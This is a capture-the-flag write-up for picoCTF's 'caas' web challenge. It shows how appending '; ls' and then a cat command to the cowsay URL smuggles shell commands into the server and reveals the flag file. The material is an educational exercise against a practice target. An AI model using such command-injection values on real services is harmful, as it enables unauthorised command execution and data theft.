# **caas   → 150 Pts.**

1. We land on the page saying 

**Make a request to the following URL to cowsay your message:**

```
https://caas.mars.picoctf.net/cowsay/{message}
```

2. For trying, We enter any random message to get an output and it does shows our message back to us.

[https://caas.mars.picoctf.net/cowsay/I_am_Ryx](https://caas.mars.picoctf.net/cowsay/I_am_Ryx)

```
 __________
< I_am_Ryx >
 ----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

3. I used _Wappalyzer_ to see what type of page we are in and what kind of services it’s using
4. Using it, we get to know that it uses _node.js_ services (_index.js_ is already given to us as a separate file for downloading)
5. So tried appending it in the end ```; ls```

[https://caas.mars.picoctf.net/cowsay/ryx; ls](https://caas.mars.picoctf.net/cowsay/ryx;%20ls)

```
 _____
< ryx >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

6. We have _falg.txt_ here so we will simply cat it out. 

```
 _____
< ryx >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

7. There we have it…our flag.


## It was a notorious challenge, as it required us to use our pre gained knowledge of JS and web files.
